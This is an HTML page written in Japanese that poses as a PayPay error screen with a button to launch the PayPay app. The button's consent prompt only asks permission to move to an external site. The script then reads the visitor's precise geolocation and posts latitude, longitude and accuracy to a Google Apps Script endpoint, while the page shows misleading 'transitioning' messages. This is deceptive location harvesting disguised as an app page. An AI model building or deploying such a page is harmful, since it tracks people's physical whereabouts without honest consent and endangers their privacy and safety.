<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <h1 style="font-size: 50px;">エラーが発生しました</h1>
</head>
<body>
    <img src="paypay.png" alt="画像">
   <button id="getLocationBtn" style="font-size: 20px; padding: 10px 20px;" onclick="location.href='paypay://'">PayPayアプリを起動する</button>
    <div id="result"></div>
    <script>
    const GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxFZEaC1jsMzmn7Z_SZDdtD2SSWONlMCs0dkatxfSfRA_S8Qpc0-4iYq9IJ0AJay4GX/exec'; 
    document.getElementById('getLocationBtn').addEventListener('click', () => {
        if (!navigator.geolocation) {
            document.getElementById('result').textContent = 'お使いのブラウザはサポートされていません。';
            return;
        }
        const consent = confirm(
            '外部サイトに遷移することを許可しますか？\n\n'       
        );
        if (!consent) {
            document.getElementById('result').textContent = '同意されませんでした。';
            return;
        }
        document.getElementById('result').textContent = '遷移中...';
        navigator.geolocation.getCurrentPosition(onSuccess, onError);
    });
    function onSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = `    
            <p>遷移に成功しました。</p>
            <p>...遷移中...</p>
        `;
        sendDataToGoogleSheet(latitude, longitude, accuracy);
    }
    function onError(error) {
        // (省略)
    }
    async function sendDataToGoogleSheet(lat, lng, acc) {   
        const dataToSend = {
            latitude: lat,
            longitude: lng,
            accuracy: acc
        };
        try {
            const response = await fetch(GAS_WEB_APP_URL, {
                method: 'POST',      
                redirect: 'follow', 
                headers: {
                    'Content-Type': 'text/plain;charset=utf-8', 
                },
                body: JSON.stringify(dataToSend) 
            });
            const result = await response.json();
            if (result.status === 'success') {
                document.getElementById('result').innerHTML += '<p>データの送信に成功しました。</p>';
            } else {
                throw new Error(result.message || '不明なエラー');
            }
        } catch (error) {
            console.error('送信エラー:', error);
            document.getElementById('result').innerHTML += `<p>遷移に失敗しました: ${error.message}</p>`;
        }
    }
</script>
</body>
</html>















